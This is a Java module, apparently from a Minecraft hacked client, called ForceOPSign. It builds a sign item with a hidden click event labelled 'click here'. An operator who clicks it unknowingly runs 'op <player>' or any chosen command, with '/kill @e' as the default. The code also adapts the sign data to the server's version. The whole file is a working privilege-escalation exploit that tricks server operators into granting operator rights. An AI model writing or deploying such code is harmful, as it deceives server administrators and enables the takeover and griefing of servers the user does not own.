package dev.mlml.korppu.module.modules;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.config.BooleanSetting;
import dev.mlml.korppu.config.ListSetting;
import dev.mlml.korppu.config.StringSetting;
import dev.mlml.korppu.gui.ChatHelper;
import dev.mlml.korppu.mixin.IPlayerInventoryMixin;
import dev.mlml.korppu.module.Module;
import dev.mlml.korppu.module.StatusEntry;
import net.minecraft.world.level.block.entity.BlockEntityType;
import net.minecraft.core.component.DataComponents;
import net.minecraft.world.item.component.TypedEntityData;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.world.inventory.ContainerInput;
import org.lwjgl.glfw.GLFW;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ForceOPSign extends Module {
    private final ListSetting<Mode> mode = config.add(new ListSetting<>("Mode", "Payload mode", Mode.ForceOP));
    private final StringSetting target = config.add(new StringSetting("Target", "Player to OP in ForceOP mode", "Player").showOnlyIf(() -> mode.getValue() == Mode.ForceOP));
    private final StringSetting command = config.add(new StringSetting("Command", "Command in AnyCommand mode", "/kill @e").showOnlyIf(() -> mode.getValue() == Mode.AnyCommand));
    private final StringSetting label = config.add(new StringSetting("Label", "Clickable sign text", "click here"));
    private final BooleanSetting autoCompat = config.add(new BooleanSetting("AutoCompat", "Auto-select NBT format by server version", true));

    public ForceOPSign() {
        super("ForceOPSign", "Requires creative mode; creates a clickable command sign", GLFW.GLFW_KEY_UNKNOWN);
    }

    @Override
    public void onEnable() {
        setEnabled(false);
        if (KorppuMod.mc.player == null || KorppuMod.mc.gameMode == null) return;

        if (!KorppuMod.mc.player.getAbilities().instabuild) {
            ChatHelper.message("ForceOPSign requires creative mode.");
            return;
        }

        String cmd = mode.getValue() == Mode.ForceOP
                ? "op " + sanitizedTarget()
                : stripLeadingSlash(command.getValue());

        ItemStack stack = new ItemStack(Items.OAK_SIGN);
        stack.set(DataComponents.BLOCK_ENTITY_DATA, createEntityData(cmd));

        int selectedSlot = ((IPlayerInventoryMixin) (Object) KorppuMod.mc.player.getInventory()).getSelectedSlot();
        int slot = 36 + selectedSlot;
        KorppuMod.mc.gameMode.handleCreativeModeItemAdd(stack, slot);
        KorppuMod.mc.gameMode.handleContainerInput(KorppuMod.mc.player.containerMenu.containerId, slot, 0, ContainerInput.PICKUP, KorppuMod.mc.player);
        KorppuMod.mc.gameMode.handleContainerInput(KorppuMod.mc.player.containerMenu.containerId, slot, 0, ContainerInput.PICKUP, KorppuMod.mc.player);
    }

    private TypedEntityData<BlockEntityType<?>> createEntityData(String commandValue) {
        boolean oldClickNbt = shouldUseLegacyClickNbt();

        CompoundTag firstLine = makeLine(commandValue, oldClickNbt);
        CompoundTag secondLine = makeBlankLine();
        CompoundTag thirdLine = makeBlankLine();
        CompoundTag fourthLine = makeBlankLine();

        ListTag messages = new ListTag();
        messages.add(firstLine);
        messages.add(secondLine);
        messages.add(thirdLine);
        messages.add(fourthLine);

        CompoundTag textFront = new CompoundTag();
        textFront.put("messages", messages);
        CompoundTag textBack = new CompoundTag();
        textBack.put("messages", messages);

        CompoundTag blockEntityTag = new CompoundTag();
        blockEntityTag.put("front_text", textFront);
        blockEntityTag.put("back_text", textBack);
        blockEntityTag.putString("id", shouldUseLegacySignId() ? "minecraft:oak_sign" : "minecraft:sign");

        return TypedEntityData.of(BlockEntityType.SIGN, blockEntityTag);
    }

    private CompoundTag makeLine(String commandValue, boolean oldClickNbt) {
        CompoundTag line = new CompoundTag();
        String text = label.getValue().trim();
        line.putString("text", text.isEmpty() ? "click here" : text);

        CompoundTag click = new CompoundTag();
        click.putString("action", "run_command");
        if (oldClickNbt) {
            click.putString("value", commandValue);
            line.put("clickEvent", click);
        } else {
            click.putString("command", commandValue);
            line.put("click_event", click);
        }

        return line;
    }

    private CompoundTag makeBlankLine() {
        CompoundTag line = new CompoundTag();
        line.putString("text", "\n");
        return line;
    }

    private boolean shouldUseLegacyClickNbt() {
        if (!autoCompat.getValue()) return false;
        String version = detectServerVersion();
        return version != null && isVersionLessThan(version, 1, 21, 5);
    }

    private boolean shouldUseLegacySignId() {
        if (!autoCompat.getValue()) return false;
        String version = detectServerVersion();
        return version != null && isVersionLessThan(version, 1, 21, 4);
    }

    private String detectServerVersion() {
        if (KorppuMod.mc.hasSingleplayerServer() && KorppuMod.mc.getSingleplayerServer() != null) {
            return KorppuMod.mc.getSingleplayerServer().getServerVersion();
        }
        if (KorppuMod.mc.getCurrentServer() != null && KorppuMod.mc.getCurrentServer().version != null) {
            return KorppuMod.mc.getCurrentServer().version.getString();
        }
        return null;
    }

    private boolean isVersionLessThan(String serverVersion, int major, int minor, int patch) {
        Matcher matcher = Pattern.compile("(\\d+)\\.(\\d+)\\.(\\d+)").matcher(serverVersion);
        if (!matcher.find()) return false;

        int serverMajor = Integer.parseInt(matcher.group(1));
        int serverMinor = Integer.parseInt(matcher.group(2));
        int serverPatch = Integer.parseInt(matcher.group(3));

        if (serverMajor != major) return serverMajor < major;
        if (serverMinor != minor) return serverMinor < minor;
        return serverPatch < patch;
    }

    private String sanitizedTarget() {
        String value = target.getValue().trim();
        if (!value.isEmpty()) return value;
        if (KorppuMod.mc.player != null) return KorppuMod.mc.player.getName().getString();
        return "Player";
    }

    private String stripLeadingSlash(String value) {
        String command = value == null ? "kill @e" : value.trim();
        if (command.isEmpty()) command = "kill @e";
        return command.startsWith("/") ? command.substring(1) : command;
    }

    @Override
    public List<StatusEntry> getStatusEntries() {
        return List.of(
                StatusEntry.text("Mode", mode.getValue().name()),
                StatusEntry.text("Target", sanitizedTarget())
        );
    }

    public enum Mode {
        ForceOP,
        AnyCommand
    }
}
